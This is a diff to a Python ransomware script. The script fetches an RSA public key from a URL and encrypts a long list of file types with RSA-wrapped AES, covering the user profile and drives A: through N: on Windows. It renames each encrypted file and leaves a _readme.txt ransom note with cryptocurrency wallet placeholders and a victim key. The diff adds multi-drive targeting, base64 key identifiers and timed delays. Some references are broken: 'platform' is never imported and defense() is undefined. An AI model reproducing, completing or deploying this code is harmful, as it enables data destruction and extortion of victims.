@@ -1,5 +1,6 @@
 import os
 import random
+import base64
 import requests as req
 from time import sleep
 from cryptography.fernet import Fernet as xf
@@ -7,18 +8,32 @@ from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
 from Crypto.Cipher import AES, PKCS1_OAEP
 
-url_web = "Your Url Publilc Key"
-url_list = ["List of key"]
-URL_KEY = url_web + random.choice(url_list)
+# On Local PC
+#url_web = 'Pub Folder'
+#url_list = [List Key]
+#key_c = random.choice(url_list)
+#ext = '.' + key_c.split('.')[1]
+#URL_KEY = key_c
+#pbk = open(URL_KEY).read()
+#print(pbk)
+#lcx = key_c.split('.pem')[0]
+
+# On Website
+url_web = "YOUR URL"
+url_list = [LIST KEY]
+key_c = random.choice(url_list)
+ext = '.' + key_c.split('.')[1]
+URL_KEY = url_web + key_c
 pbk = req.get(URL_KEY).text
-lcx = URL_KEY.split('/')[3].split('.')[0]
+lcy = base64.b64encode(key_c.split('.pem')[0].encode('utf-8'))
+lcx = lcy.decode('utf-8')
 
 WALLET_ADDRESS = '''
 BTC_ADDRESS  : 
 TRX_ADDRESS  : 
 BUSD_ADDRESS : 
 '''
-CONTACT = '''Your Contact'''
+CONTACT = '''YOUR CONTACT'''
 
 
 def encrypt(filename):
@@ -37,6 +52,7 @@ def encrypt(filename):
     with open(filename, "wb") as file:
         [ file.write(x) for x in (enc_session_key, cipher_aes.nonce, tag, ciphertext) ]
 
+
 def attack(target):
 
     fl = ".c",".dll",".jpeg",".JPEG",".jpg",".JPG",".png",".PNG",".bmp",".BMP",".doc",".DOC",".docx",".xls",".xlsx",".ppt",".pptx",".pdf",".mp4",".mkv",".mpeg",".avi",".ai",".ait",".cdr",".odt",".ods",".odp",".msi",".bat",".vbs",".html",".php",".js",".css"
@@ -46,7 +62,7 @@ def attack(target):
             if name.endswith((fl)):
                 try:
                     encrypt(os.path.join(p, name))
-                    newFile = name +  ".itsec"
+                    newFile = name +  ext
                     os.rename(os.path.join(p, name), os.path.join(p,newFile))
                 except:
                     continue
@@ -63,15 +79,28 @@ def attack(target):
 
                 Choice one payment\n'''+ WALLET_ADDRESS + '''
                 
-                Your Personal Key is : ''' + lcx + '''
+                Your Personal Key is : ''' + lcx.split('.')[0] + '''
 
                 ''' + CONTACT + '''
                 Thank You For Your Attention (*v*)'''
-                with open(p + '\\' + '_readme.txt', 'w') as f:
+
+                with open(p + '\\_readme.txt', 'w') as f:
                     f.writelines(lines)
+                with open(p + '\\.license','w') as l:
+                    l.write(lcx)
             except PermissionError:
                 problem = "Tidak bisa di isi file"
 
 if __name__ == '__main__':
-    t0 = os.environ["USERPROFILE"]
-    attack(t0)
+    if (platform == 'win32'):
+        t = [os.environ["USERPROFILE"],"A:","B:","D:","E:","F:","G:","H:","I:","J:","K:","L:","M:","N:"]
+        for i in range(len(t)):
+            attack(t[i])
+            sleep(1800)
+    elif (platform == 'linux'):
+        t = ['~']
+        for i in range(len(t)):
+            defense(t[i])
+            sleep(1800)
+    else:
+        print('I will better')
